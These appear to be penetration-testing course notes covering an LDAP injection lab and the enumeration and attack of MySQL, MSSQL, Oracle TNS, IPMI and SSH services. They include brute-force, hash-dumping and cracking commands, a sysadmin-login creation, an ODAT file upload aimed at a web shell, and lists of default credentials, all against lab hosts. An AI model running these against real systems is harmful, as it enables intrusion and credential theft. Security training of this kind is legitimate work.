Code: php

$username = "dummy";
$password = "*";
(&(objectClass=user)(sAMAccountName=$username)(userPassword=$password))

LDAP injection attacks can lead to severe consequences, such as unauthorised access to sensitive information, elevated privileges, and even full control over the affected application or server. These attacks can also considerably impact data integrity and availability, as attackers may alter or remove data within the directory service, causing disruptions to applications and services dependent on that data.

To mitigate the risks associated with LDAP injection attacks, it is crucial to thoroughly validate and sanitize user input before incorporating it into LDAP queries. This process should involve removing LDAP-specific special characters like * and employing parameterised queries to ensure user input is treated solely as data, not executable code.
Enumeration

Enumerating the target helps us to understand services and exposed ports. An nmap services scan is a type of network scanning technique used to identify and analyze the services running on a target system or network. By probing open ports and assessing the responses, nmap is able to deduce which services are active and their respective versions. The scan provides valuable information about the target's network infrastructure, and potential vulnerabilities and attack surfaces.
nmap
nmap

m1l0js@htb[/htb]$ nmap -p- -sC -sV --open --min-rate=1000 10.129.204.229

Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-23 14:43 SAST
Nmap scan report for 10.129.204.229
Host is up (0.18s latency).
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE VERSION
80/tcp  open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Login
389/tcp open  ldap    OpenLDAP 2.2.X - 2.3.X

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 149.73 seconds

nmap detects a http server running on port 80 and an ldap server running on port 389
Injection

As OpenLDAP runs on the server, it is safe to assume that the web application running on port 80 uses LDAP for authentication.

Attempting to log in using a wildcard character (*) in the username and password fields grants access to the system, effectively bypassing any authentication measures that had been implemented. This is a significant security issue as it allows anyone with knowledge of the vulnerability to gain unauthorised access to the system and potentially sensitive data.












-=-==-=-=

[+] Metasploit
	use auxiliary/scanner/mysql/mysql_schemadump
      		set password ""
      	use auxiliary/scanner/mysql/mysql_file_enum
      	  	set file_list /usr/share/metasploit-framework/data/wordlists/sensitive_files.txt

      	use auxiliary/scanner/mysql/mysql_writable_dirs
      	  	set dir_list /usr/share/metasploit-framework/data/wordlists/directory.txt
      	  	set password ""
      	use auxiliary/scannner/mysql/mysql_hashdump
      	  	set username root
      	  	set password ""
    	
	dictionary attack
        	use auxiliary/scanner/mysql/mysql_login
          		set pass_file /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
[+] Hydra
	hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.228.123.3 mysql
####MSSQL
  > Microsoft SQL (MSSQL) is Microsoft's SQL-based relational database management system. Unlike MySQL, which we discussed in the last section, MSSQL is closed source and was initially written to run on Windows operating systems. It is popular among database administrators and developers when building applications that run on Microsoft's .NET framework due to its strong native support for .NET. There are versions of MSSQL that will run on Linux and MacOS, but we will more likely come across MSSQL instances on targets running Windows.
  > By default, MSSQL uses ports TCP/1433 and UDP/1434. However, when MSSQL operates in a "hidden" mode, it uses the TCP/2433 port.

MSSQL Clients
  > SQL Server Management Studio (SSMS ==> https://docs.microsoft.com/en-us/sql/ssms/download-sql-server-management-studio-ssms?view=sql-server-ver15) comes as a feature that can be installed with the MSSQL install package or can be downloaded & installed separately. It is commonly installed on the server for initial configuration and long-term management of databases by admins. Keep in mind that since SSMS is a client-side application, it can be installed and used on any system an admin or developer is planning to manage the database from. It doesn't only exist on the server hosting the database. This means we could come across a vulnerable system with SSMS with saved credentials that allow us to connect to the database. 
  > Many other clients can be used to access a database running on MSSQL. Including but not limited to:
    mssql-cli
    SQL Server PowerShell	
    HediSQL	
    SQLPro	
    Impacket's mssqlclient.py
  > Of the MSSQL clients listed above, pentester's may find Impacket's mssqlclient.py to be the most useful due to SecureAuthCorp's Impacket project being present on many pentesting distributions at install. 
[+] MSSQL Databases
  > MSSQL has default system databases(https://docs.microsoft.com/en-us/sql/relational-databases/databases/system-databases?view=sql-server-ver15) that can help us understand the structure of all the databases that may be hosted on a target server. Here are the default databases and a brief description of each:
  Default System Database	Description
  master	  Tracks all system information for an SQL server instance
  model	    Template database that acts as a structure for every new database created. Any setting changed in the model database will be reflected in any new database created after changes to the model database
  msdb	    The SQL Server Agent uses this database to schedule jobs & alerts
  tempdb	  Stores temporary objects
  resource	Read-only database containing system objects included with SQL server
[+] Authentication mechanisms
    > MSSQL supports two authentication modes, which means that users can be created in Windows or the SQL Server:
        Authentication Type 	        Description
        Windows authentication mode 	This is the default, often referred to as integrated security because the SQL Server security model is tightly integrated with Windows/Active Directory. 
                                        Specific Windows user and group accounts are trusted to log in to SQL Server. Windows users who have already been authenticated do not have to present additional credentials.
        Mixed mode 	                    Mixed mode supports authentication by Windows/Active Directory accounts and SQL Server. Username and password pairs are maintained within SQL Server.
[+] Default configuration
  > When an admin initially installs and configures MSSQL to be network accessible, the SQL service will likely run as NT SERVICE\MSSQLSERVER. Connecting from the client-side is possible through Windows Authentication, and by default, encryption is not enforced when attempting to connect.
  > Authentication being set to Windows Authentication means that the underlying Windows OS will process the login request and use either the local SAM database or the domain controller (hosting Active Directory) before allowing connectivity to the database management system. Using Active Directory can be ideal for auditing activity and controlling access in a Windows environment, but if an account is compromised, it could lead to privilege escalation and lateral movement across a Windows domain environment. Like with any OS, service, server role, or application, it can be beneficial to set it up in a VM from installation to configuration to understand all the default configurations and potential mistakes that the administrator could make.
[+] Dangerous settings
  > It can be beneficial to place ourselves in the perspective of an IT administrator when we are on an engagement. This mindset can help us remember to look for various settings that may have been misconfigured or configured in a dangerous manner by an admin. A workday in IT can be rather busy, with lots of different projects happening simultaneously and the pressure to perform with speed & accuracy being a reality in many organizations, mistakes can be easily made. It only takes one tiny misconfiguration that could compromise a critical server or service on the network. This applies to just about every network service and server role that can be configured, including MSSQL.

  > This is not an extensive list because there are countless ways MSSQL databases can be configured by admins based on the needs of their respective organizations. We may benefit from looking into the following:
    * MSSQL clients not using encryption to connect to the MSSQL server
    * The use of self-signed certificates when encryption is being used. It is possible to spoof self-signed certificates
    * The use of named pipes
    * Weak & default sa credentials. Admins may forget to disable this account
[+] Footprinting the service
  > Nmap
    * NMAP has default mssql scripts that can be used to target the default tcp port 1433 that MSSQL listens on.
      sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.129.201.248
	    nmap 192.228.123.3 -p 1433 --script ms-sql-info
      nmap 192.228.123.3 -p 1433 --script ms-sql-ntlm-info --script-args mssql.instance-port=1433
      nmap 192.228.123.3 -p 1433 --script ms-sql-brute --script-args userdb=/root/Desktop/wordlist/common_users.txt,passdb=/root/Desktop/wordlist/100-common-passwords.txt
      nmap 192.228.123.3 -p 1433 --script ms-sql-empty-password
      nmap 192.228.123.3 -p 1433 --script ms-sql-query --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-query.query="SELECT * FROM master..syslogins" -oN output.txt
      nmap 192.228.123.3 -p 1433 --script ms-sql-dump-hashes --script-args mssql.username=admin,mssql.password=anamaria
      nmap 192.228.123.3 -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd="ipconfig"
  > Metasploit
    * We can also use Metasploit to run an auxiliary scanner called mssql_ping that will scan the MSSQL service and provide helpful information in our footprinting process.
      msf6 auxiliary(scanner/mssql/mssql_ping)
	    use auxiliary/scanner/mssql/mssql_login
      	set user_file /root/Desktop/wordlist/common_users.txt
      	set pass_file /root/Desktop/wordlist/100-common-passwords.txt
      use auxiliary/admin/mssql/mssql_enum
      use auxiliary/admin/mssql/mssql_enum_sql_logins
      use auxiliary/admin/mssql/mssql_exec
      	set cmd whoami
      use auxiliary/admin/mssql/mssql_enum_domains_accounts
  > Manual
    * If we can guess or gain access to credentials, this allows us to remotely connect to the MSSQL server and start interacting with databases using T-SQL (Transact-SQL). Authenticating with MSSQL will enable us to interact directly with databases through the SQL Database Engine. From Pwnbox or a personal attack host, we can use Impacket's mssqlclient.py to connect as seen in the output below. Once connected to the server, it may be good to get a lay of the land and list the databases present on the system.
      [+] Using Impacket mssqlclient.py
        python3 mssqlclient.py Administrator@10.129.201.248 -windows-auth
		    mssqlclient.py [-db volume] <DOMAIN>/<USERNAME>:<PASSWORD>@<IP>
      [+] Recommended -windows-auth when you are going to use a domain. Use as domain the netBIOS name of the machine
      		mssqlclient.py [-db volume] -windows-auth <DOMAIN>/<USERNAME>:<PASSWORD>@<IP>
  > Once connected
    SQL> select name from sys.databases
* Sqsh
	sqsh -S <IP> -U <Username> -P <Password> -D <Database>
	[+] In case Windows Auth using "." as domain name for local user
      	sqsh -S <IP> -U .\\<Username> -P <Password> -D <Database> 
	[+] In sqsh you need to use GO after writting the query to send it
      		1> select 1;
      		2> go
	[+] Get version
      		select @@version;
      	[+] Get user
      		select user_name();
      	[+] Get databases
      		SELECT name FROM master.dbo.sysdatabases;
      	[+] Use database
      		USE master
      	[+] Get table names
      		SELECT * FROM <databaseName>.INFORMATION_SCHEMA.TABLES;
      	[+] List Linked Servers
      		EXEC sp_linkedservers
      		SELECT * FROM sys.servers;
      	[+] List users
      		select sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by sp.name;
        [+] Other way to list users
          10.129.30.222
          select * from accounts.dbo.devsacc
      	[+] Create user with sysadmin privs
      		CREATE LOGIN hacker WITH PASSWORD = 'P@ssword123!'
      		sp_addsrvrolemember 'hacker', 'sysadmin'


#####Oracle TNS

	> The Oracle Transparent Network Substrate (TNS) server is a communication protocol that facilitates communication between Oracle databases and applications over networks. Initially introduced as part of the Oracle Net Services software suite, TNS supports various networking protocols between Oracle databases and client applications, such as IPX/SPX and TCP/IP protocol stacks. As a result, it has become a preferred solution for managing large, complex databases in the healthcare, finance, and retail industries. In addition, its built-in encryption mechanism ensures the security of data transmitted, making it an ideal solution for enterprise environments where data security is paramount.
	> Over time, TNS has been updated to support newer technologies, including IPv6 and SSL/TLS encryption which makes it more suitable for the following purposes:
		- Name resolution 	
		- Connection management 	
		- Load balancing 	
		- Security
	> Furthermore, it enables encryption between client and server communication through an additional layer of security over the TCP/IP protocol layer. This feature helps secure the database architecture from unauthorized access or attacks that attempt to compromise the data on the network traffic. Besides, it provides advanced tools and capabilities for database administrators and developers since it offers comprehensive performance monitoring and analysis tools, error reporting and logging capabilities, workload management, and fault tolerance through database services.

* Default Configuration
	> The default configuration of the Oracle TNS server varies depending on the version and edition of Oracle software installed. However, some common settings are usually configured by default in Oracle TNS. By default, the listener listens for incoming connections on the TCP/1521 port. However, this default port can be changed during installation or later in the configuration file. The TNS listener is configured to support various network protocols, including TCP/IP, UDP, IPX/SPX, and AppleTalk. The listener can also support multiple network interfaces and listen on specific IP addresses or all available network interfaces. By default, Oracle TNS can be remotely managed in Oracle 8i/9i but not in Oracle 10g/11g.
	> The default configuration of the TNS listener also includes a few basic security features. For example, the listener will only accept connections from authorized hosts and perform basic authentication using a combination of hostnames, IP addresses, and usernames and passwords. Additionally, the listener will use Oracle Net Services to encrypt the communication between the client and the server. The configuration files for Oracle TNS are called tnsnames.ora and listener.ora and are typically located in the ORACLE_HOME/network/admin directory. The plain text file contains configuration information for Oracle database instances and other network services that use the TNS protocol.
	> Oracle TNS is often used with other Oracle services like Oracle DBSNMP, Oracle Databases, Oracle Application Server, Oracle Enterprise Manager, Oracle Fusion Middleware, web servers, and many more. There have been made many changes for the default installation of Oracle services. For example, Oracle 9 has a default password, CHANGE_ON_INSTALL, whereas Oracle 10 has no default password set. The Oracle DBSNMP service also uses a default password, dbsnmp that we should remember when we come across this one. Another example would be that many organizations still use the finger service together with Oracle, which can put Oracle's service at risk and make it vulnerable when we have the required knowledge of a home directory.
	> Each database or service has a unique entry in the tnsnames.ora file, containing the necessary information for clients to connect to the service. The entry consists of a name for the service, the network location of the service, and the database or service name that clients should use when connecting to the service. For example, a simple tnsnames.ora file might look like this:
	> Tnsnames.ora
		ORCL =
		  (DESCRIPTION =
		    (ADDRESS_LIST =
		      (ADDRESS = (PROTOCOL = TCP)(HOST = 10.129.11.102)(PORT = 1521))
		    )
		    (CONNECT_DATA =
		      (SERVER = DEDICATED)
		      (SERVICE_NAME = orcl)
		    )
		  )

	> Here we can see a service called ORCL, which is listening on port TCP/1521 on the IP address 10.129.11.102. Clients should use the service name orcl when connecting to the service. However, the tnsnames.ora file can contain many such entries for different databases and services. The entries can also include additional information, such as authentication details, connection pooling settings, and load balancing configurations.
	> On the other hand, the listener.ora file is a server-side configuration file that defines the listener process's properties and parameters, which is responsible for receiving incoming client requests and forwarding them to the appropriate Oracle database instance.
	> Listener.ora
		SID_LIST_LISTENER =
		  (SID_LIST =
		    (SID_DESC =
		      (SID_NAME = PDB1)
		      (ORACLE_HOME = C:\oracle\product\19.0.0\dbhome_1)
		      (GLOBAL_DBNAME = PDB1)
		      (SID_DIRECTORY_LIST =
		        (SID_DIRECTORY =
		          (DIRECTORY_TYPE = TNS_ADMIN)
		          (DIRECTORY = C:\oracle\product\19.0.0\dbhome_1\network\admin)
		        )
		      )
		    )
		  )
		
		LISTENER =
		  (DESCRIPTION_LIST =
		    (DESCRIPTION =
		      (ADDRESS = (PROTOCOL = TCP)(HOST = orcl.inlanefreight.htb)(PORT = 1521))
		      (ADDRESS = (PROTOCOL = IPC)(KEY = EXTPROC1521))
		    )
		  )
		
		ADR_BASE_LISTENER = C:\oracle
	> In short, the client-side Oracle Net Services software uses the tnsnames.ora file to resolve service names to network addresses, while the listener process uses the listener.ora file to determine the services it should listen to and the behavior of the listener.

	> Oracle databases can be protected by using so-called PL/SQL Exclusion List (PlsqlExclusionList). It is a user-created text file that needs to be placed in the $ORACLE_HOME/sqldeveloper directory, and it contains the names of PL/SQL packages or types that should be excluded from execution. Once the PL/SQL Exclusion List file is created, it can be loaded into the database instance. It serves as a blacklist that cannot be accessed through the Oracle Application Server.
		Setting 		Description
		DESCRIPTION 		A descriptor that provides a name for the database and its connection type.
		ADDRESS 		The network address of the database, which includes the hostname and port number.
		PROTOCOL 		The network protocol used for communication with the server
		PORT 			The port number used for communication with the server
		CONNECT_DATA 		Specifies the attributes of the connection, such as the service name or SID, protocol, and database instance identifier.
		INSTANCE_NAME 		The name of the database instance the client wants to connect.
		SERVICE_NAME 		The name of the service that the client wants to connect to.
		SERVER 			The type of server used for the database connection, such as dedicated or shared.
		USER 			The username used to authenticate with the database server.
		PASSWORD 		The password used to authenticate with the database server.
		SECURITY 		The type of security for the connection.
		VALIDATE_CERT 		Whether to validate the certificate using SSL/TLS.
		SSL_VERSION 		The version of SSL/TLS to use for the connection.
		CONNECT_TIMEOUT 	The time limit in seconds for the client to establish a connection to the database.
		RECEIVE_TIMEOUT 	The time limit in seconds for the client to receive a response from the database.
		SEND_TIMEOUT 		The time limit in seconds for the client to send a request to the database.
		SQLNET.EXPIRE_TIME 	The time limit in seconds for the client to detect a connection has failed.
		TRACE_LEVEL 		The level of tracing for the database connection.
		TRACE_DIRECTORY 	The directory where the trace files are stored.
		TRACE_FILE_NAME 	The name of the trace file.
		LOG_FILE 		The file where the log information is stored.

	> Before we can enumerate the TNS listener and interact with it, we need to download a few packages and tools for our Pwnbox instance in case it does not have these already. Here is a Bash script that does all of that:

* Oracle-Tools-setup.sh
	#!/bin/bash
	
	sudo apt-get install libaio1 python3-dev alien python3-pip -y
	git clone https://github.com/quentinhardy/odat.git
	cd odat/
	git submodule init
	sudo submodule update
	sudo apt install oracle-instantclient-basic oracle-instantclient-devel oracle-instantclient-sqlplus -y
	pip3 install cx_Oracle
	sudo apt-get install python3-scapy -y
	sudo pip3 install colorlog termcolor pycryptodome passlib python-libnmap
	sudo pip3 install argcomplete && sudo activate-global-python-argcomplete

	> After that, we can try to determine if the installation was successful by running the following command:
	> Testing ODAT
		m1l0js@htb[/htb]$ ./odat.py -h
	> Oracle Database Attacking Tool (ODAT) is an open-source penetration testing tool written in Python and designed to enumerate and exploit vulnerabilities in Oracle databases. It can be used to identify and exploit various security flaws in Oracle databases, including SQL injection, remote code execution, and privilege escalation.

	> Let's now use nmap to scan the default Oracle TNS listener port.
	> Nmap
		m1l0js@htb[/htb]$ sudo nmap -p1521 -sV 10.129.204.235 --open

	> We can see that the port is open, and the service is running. In Oracle RDBMS, a System Identifier (SID) is a unique name that identifies a particular database instance. It can have multiple instances, each with its own System ID. An instance is a set of processes and memory structures that interact to manage the database's data. When a client connects to an Oracle database, it specifies the database's SID along with its connection string. The client uses this SID to identify which database instance it wants to connect to. Suppose the client does not specify a SID. Then, the default value is defined in the tnsnames.ora file is used.
	> The SIDs are an essential part of the connection process, as it identifies the specific instance of the database the client wants to connect to. If the client specifies an incorrect SID, the connection attempt will fail. Database administrators can use the SID to monitor and manage the individual instances of a database. For example, they can start, stop, or restart an instance, adjust its memory allocation or other configuration parameters, and monitor its performance using tools like Oracle Enterprise Manager.
	> There are various ways to enumerate, or better said, guess SIDs. Therefore we can use tools like nmap, hydra, odat, and others. Let us use nmap first.
	> Nmap - SID Bruteforcing
		m1l0js@htb[/htb]$ sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute

	> We can use the odat.py tool to perform a variety of scans to enumerate and gather information about the Oracle database services and its components. Those scans can retrieve database names, versions, running processes, user accounts, vulnerabilities, misconfigurations, etc. Let us use the all option and try all modules of the odat.py tool.
	> ODAT
		m1l0js@htb[/htb]$ ./odat.py all -s 10.129.204.235

	> In this example, we found valid credentials for the user scott and his password tiger. After that, we can use the tool sqlplus to connect to the Oracle database and interact with it.
	> SQLplus - Log In
		m1l0js@htb[/htb]$ sqlplus scott/tiger@10.129.204.235/XE;

	> There are many SQLplus commands(https://docs.oracle.com/cd/E11882_01/server.112/e41085/sqlqraa001.htm#SQLQR985) that we can use to enumerate the database manually. For example, we can list all available tables in the current database or show us the privileges of the current user like the following:
	> Oracle RDBMS - Interaction
		SQL> select table_name from all_tables;
		SQL> select * from user_role_privs;
			USERNAME                       GRANTED_ROLE                   ADM DEF OS_
			------------------------------ ------------------------------ --- --- ---
			SCOTT                          CONNECT                        NO  YES NO
			SCOTT                          RESOURCE                       NO  YES NO

	> Here, the user scott has no administrative privileges. However, we can try using this account to log in as the System Database Admin (sysdba), giving us higher privileges. This is possible when the user scott have the appropriate privileges typically granted by the database administrator or used by the administrator him-/herself.
	> Oracle RDBMS - Database Enumeration
		m1l0js@htb[/htb]$ sqlplus scott/tiger@10.129.204.235/XE as sysdba

	> We can follow many approaches once we get access to an Oracle database. It highly depends on the information we have and the entire setup. However, we can not add new users or make any modifications. From this point, we could retrieve the password hashes from the sys.user$ and try to crack them offline. The query for this would look like the following:
	> Oracle RDBMS - Extract Password Hashes
		SQL> select name, password from sys.user$;

	> Another option is to upload a web shell to the target. However, this requires the server to run a web server, and we need to know the exact location of the root directory for the webserver. Nevertheless, if we know what type of system we are dealing with, we can try the default paths, which are:
		OS 		Path
		Linux 		/var/www/html
		Windows 	C:\inetpub\wwwroot

	> First, trying our exploitation approach with files that do not look dangerous for Antivirus or Intrusion detection/prevention systems is always important. Therefore, we create a text file with a string and use it to upload to the target system.
	> Oracle RDBMS - File Upload
		m1l0js@htb[/htb]$ echo "Oracle File Upload Test" > testing.txt
		m1l0js@htb[/htb]$ ./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt

	> Finally, we can test if the file upload approach worked with curl. Therefore, we will use a GET http://<IP> request, or we can visit via browser.
	> Oracle RDBMS - File Upload
		m1l0js@htb[/htb]$ curl -X GET http://10.129.204.235/testing.txt
		Oracle File Upload Test





#####IPMI
  > Intelligent Platform Management Interface (IPMI) is a set of standardized specifications for hardware-based host management systems used for system management and monitoring. It acts as an autonomous subsystem and works independently of the host's BIOS, CPU, firmware, and underlying operating system. IPMI provides sysadmins with the ability to manage and monitor systems even if they are powered off or in an unresponsive state. It operates using a direct network connection to the system's hardware and does not require access to the operating system via a login shell. IPMI can also be used for remote upgrades to systems without requiring physical access to the target host. IPMI is typically used in three ways:

    * Before the OS has booted to modify BIOS settings
    * When the host is fully powered down
    * Access to a host after a system failure

  > When not being used for these tasks, IPMI can monitor a range of different things such as system temperature, voltage, fan status, and power supplies. It can also be used for querying inventory information, reviewing hardware logs, and alerting using SNMP. The host system can be powered off, but the IPMI module requires a power source and a LAN connection to work correctly.

  > The IPMI protocol was first published by Intel in 1998 and is now supported by over 200 system vendors, including Cisco, Dell, HP, Supermicro, Intel, and more. Systems using IPMI version 2.0 can be administered via serial over LAN, giving sysadmins the ability to view serial console output in band. To function, IPMI requires the following components:

    * Baseboard Management Controller (BMC) - A micro-controller and essential component of an IPMI
    * Intelligent Chassis Management Bus (ICMB) - An interface that permits communication from one chassis to another
    * Intelligent Platform Management Bus (IPMB) - extends the BMC
    * IPMI Memory - stores things such as the system event log, repository store data, and more
    * Communications Interfaces - local system interfaces, serial and LAN interfaces, ICMB and PCI Management Bus

[+] Footprinting the Service
  > IPMI communicates over port 623 UDP. Systems that use the IPMI protocol are called Baseboard Management Controllers (BMCs). BMCs are typically implemented as embedded ARM systems running Linux, and connected directly to the host's motherboard. BMCs are built into many motherboards but can also be added to a system as a PCI card. Most servers either come with a BMC or support adding a BMC. The most common BMCs we often see during internal penetration tests are HP iLO, Dell DRAC, and Supermicro IPMI. If we can access a BMC during an assessment, we would gain full access to the host motherboard and be able to monitor, reboot, power off, or even reinstall the host operating system. Gaining access to a BMC is nearly equivalent to physical access to a system. Many BMCs (including HP iLO, Dell DRAC, and Supermicro IPMI) expose a web-based management console, some sort of command-line remote access protocol such as Telnet or SSH, and the port 623 UDP, which, again, is for the IPMI network protocol.
  > Nmap
    sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local
  > Metasploit 
    We can also use the Metasploit scanner module IPMI Information Discovery
      auxiliary/scanner/ipmi/ipmi_version
  > During internal penetration tests, we often find BMCs where the administrators have not changed the default password. Some unique default passwords to keep in our cheatsheets include:
    Product	        Username	    Password
    Dell iDRAC	    root	        calvin
    HP iLO	        Administrator	randomized 8-character string consisting of numbers and uppercase letters
    Supermicro IPMI	ADMIN	        ADMIN
  > It is also essential to try out known default passwords for ANY services that we discover, as these are often left unchanged and can lead to quick wins. When dealing with BMCs, these default passwords may gain us access to the web console or even command line access via SSH or Telnet.

[+] Dangerous settings
  > If default credentials do not work to access a BMC, we can turn to a flaw in the RAKP protocol in IPMI 2.0. During the authentication process, the server sends a salted SHA1 or MD5 hash of the user's password to the client before authentication takes place. This can be leveraged to obtain the password hash for ANY valid user account on the BMC. These password hashes can then be cracked offline using a dictionary attack using Hashcat mode 7300. In the event of an HP iLO using a factory default password, we can use this Hashcat mask attack command hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u which tries all combinations of upper case letters and numbers for an eight-character password.

  > There is no direct "fix" to this issue because the flaw is a critical component of the IPMI specification. Clients can opt for very long, difficult to crack passwords or implement network segmentation rules to restrict the direct access to the BMCs. It is important to not overlook IPMI during internal penetration tests (we see it during most assessments) because not only can we often gain access to the BMC web console, which is a high-risk finding, but we have seen environments where a unique (but crackable) password is set that is later re-used across other systems. On one such penetration test, we obtained an IPMI hash, cracked it offline using Hashcat, and were able to SSH into many critical servers in the environment as the root user and gain access to web management consoles for various network monitoring tools.
  > To retrieve IPMI hashes, we can use the Metasploit IPMI 2.0 RAKP Remote SHA1 Password Hash Retrieval module ==> (https://www.rapid7.com/db/modules/auxiliary/scanner/ipmi/ipmi_dumphashes/)
    msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run
      [+] 10.129.42.195:623 - IPMI - Hash found: ADMIN:8e160d4802040000205ee9253b6b8dac3052c837e23faa631260719fce740d45c3139a7dd4317b9ea123456789abcdefa123456789abcdef140541444d494e:a3e82878a09daa8ae3e6c22f9080f8337fe0ed7e
      [+] 10.129.42.195:623 - IPMI - Hash for user 'ADMIN' matches password 'ADMIN'
      [*] Scanned 1 of 1 hosts (100% complete)
      [*] Auxiliary module execution completed
    * You may want to change the dict_file to rockyou.txt
  > Here we can see that we have successfully obtained the password hash for the user ADMIN, and the tool was able to quickly crack it to reveal what appears to be a default password ADMIN. From here, we could attempt to log in to the BMC, or, if the password were something more unique, check for password re-use on other systems. IPMI is very common in network environments since sysadmins need to be able to access servers remotely in the event of an outage or perform certain maintenance tasks that they would traditionally have had to be physically in front of the server to complete. This ease of administration comes with the risk of exposing password hashes to anyone on the network and can lead to unauthorized access, system disruption, and even remote code execution. Checking for IPMI should be part of our internal penetration test playbook for any environment we find ourselves assessing.
  > With ipmiPwner ==> (https://github.com/c0rnf13ld/ipmiPwner) 
      sudo python3 ipmipwner.py --host 10.129.182.127
        * The hash format is a bit different, and doesn’t match anything hashcat knows of. Still, but removing the leading $rakp$ and replacing the other $ with : generates the same format as MSF. Because this isn’t really a hash, but a challenge and response, it makes sense that the hash for the same user can change based on how it’s collected
      /hashcat ipmi.hash /usr/share/dict/rockyou.txt --user

-=-=-=
Linux Remote Management Protocols
  > In the world of Linux distributions, there are many ways to manage the servers remotely. For example, let us imagine that we are in one of many locations and one of our employees who just went to a customer in another city needs our help because of an error that he cannot solve. Efficient troubleshooting will look difficult over a phone call in most cases, so it is beneficial if we know how to log onto the remote system to manage it.

  > These applications and services can be found on almost every server in the public network. It is time-saving since we do not have to be physically present at the server, and the working environment still looks the same. These protocols and applications for remote systems management are an exciting target for these reasons. If the configuration is incorrect, we, as penetration testers, can even quickly gain access to the remote system. Therefore, we should familiarize ourselves with the most important protocols, servers, and applications for this purpose.

[+] SSH
  > Secure Shell (SSH) enables two computers to establish an encrypted and direct connection within a possibly insecure network on the standard port TCP 22. This is necessary to prevent third parties from intercepting the data stream and thus intercepting sensitive data. The SSH server can also be configured to only allow connections from specific clients. An advantage of SSH is that the protocol runs on all common operating systems. Since it is originally a Unix application, it is also implemented natively on all Linux distributions and MacOS. SSH can also be used on Windows, provided we install an appropriate program. The well-known OpenBSD SSH (OpenSSH) server on Linux distributions is an open-source fork of the original and commercial SSH server from SSH Communication Security. Accordingly, there are two competing protocols: SSH-1 and SSH-2.

  > SSH-2, also known as SSH version 2, is a more advanced protocol than SSH version 1 in encryption, speed, stability, and security. For example, SSH-1 is vulnerable to MITM attacks, whereas SSH-2 is not.

  > We can imagine that we want to manage a remote host. This can be done via the command line or GUI. Besides, we can also use the SSH protocol to send commands to the desired system, transfer files, or do port forwarding. Therefore, we need to connect to it using the SSH protocol and authenticate ourselves to it. In total, OpenSSH has six different authentication methods:

    Password authentication
    Public-key authentication
    Host-based authentication
    Keyboard authentication
    Challenge-response authentication
    GSSAPI authentication

  > We will take a closer look at and discuss one of the most commonly used authentication methods. In addition, we can learn more about the other authentication methods here among others.
  * Public-key authentication 
    > In a first step, the SSH server and client authenticate themselves to each other. The server sends a certificate to the client to verify that it is the correct server. Only when contact is first established is there a risk of a third party interposing itself between the two participants and thus intercepting the connection. Since the certificate itself is also encrypted, it cannot be imitated. Once the client knows the correct certificate, no one else can pretend to make contact via the corresponding server.

    > After server authentication, however, the client must also prove to the server that it has access authorization. However, the SSH server is already in possession of the encrypted hash value of the password set for the desired user. As a result, users have to enter the password every time they log on to another server during the same session. For this reason, an alternative option for client-side authentication is the use of a public key and private key pair.

    > The private key is created individually for the user's own computer and secured with a passphrase that should be longer than a typical password. The private key is stored exclusively on our own computer and always remains secret. If we want to establish an SSH connection, we first enter the passphrase and thus open access to the private key.

    > Public keys are also stored on the server. The server creates a cryptographic problem with the client's public key and sends it to the client. The client, in turn, decrypts the problem with its own private key, sends back the solution, and thus informs the server that it may establish a legitimate connection. During a session, users only need to enter the passphrase once to connect to any number of servers. At the end of the session, users log out of their local machines, ensuring that no third party who gains physical access to the local machine can connect to the server.

   > Default configuration
     The sshd_config file, responsible for the OpenSSH server, has only a few of the settings configured by default. However, the default configuration includes X11 forwarding, which contained a command injection vulnerability in version 7.2p1 of OpenSSH in 2016. Nevertheless, we do not need a GUI to manage our servers.
       cat /etc/ssh/sshd_config  | grep -v "#" | sed -r '/^\s*$/d'
   > Dangerous settings
     Despite the SSH protocol being one of the most secure protocols available today, some misconfigurations can still make the SSH server vulnerable to easy-to-execute attacks. Let us take a look at the following settings:
       Setting	Description
       PasswordAuthentication yes	  Allows password-based authentication.
       PermitEmptyPasswords yes	    Allows the use of empty passwords.
       PermitRootLogin yes	          Allows to log in as the root user.
       Protocol 1	                  Uses an outdated version of encryption.
       X11Forwarding yes	            Allows X11 forwarding for GUI applications.
       AllowTcpForwarding yes	      Allows forwarding of TCP ports.
       PermitTunnel	                Allows tunneling.
       DebianBanner yes	            Displays a specific banner when logging in.
   > Allowing password authentication allows us to brute-force a known username for possible passwords. Many different methods can be used to guess the passwords of users. For this purpose, specific patterns` are usually used to mutate the most commonly used passwords and, frighteningly, correct them. This is because we humans are lazy and do not want to remember complex and complicated passwords. Therefore, we create passwords that we can easily remember, and this leads to the fact that, for example, numbers or characters are added only at the end of the password. Believing that the password is secure, the mentioned patterns are used to guess precisely such "adjustments" of these passwords. However, some instructions and hardening guides(https://www.ssh-audit.com/hardening_guides.html) can be used to harden our SSH servers.
      
   [+] Footprinting the service
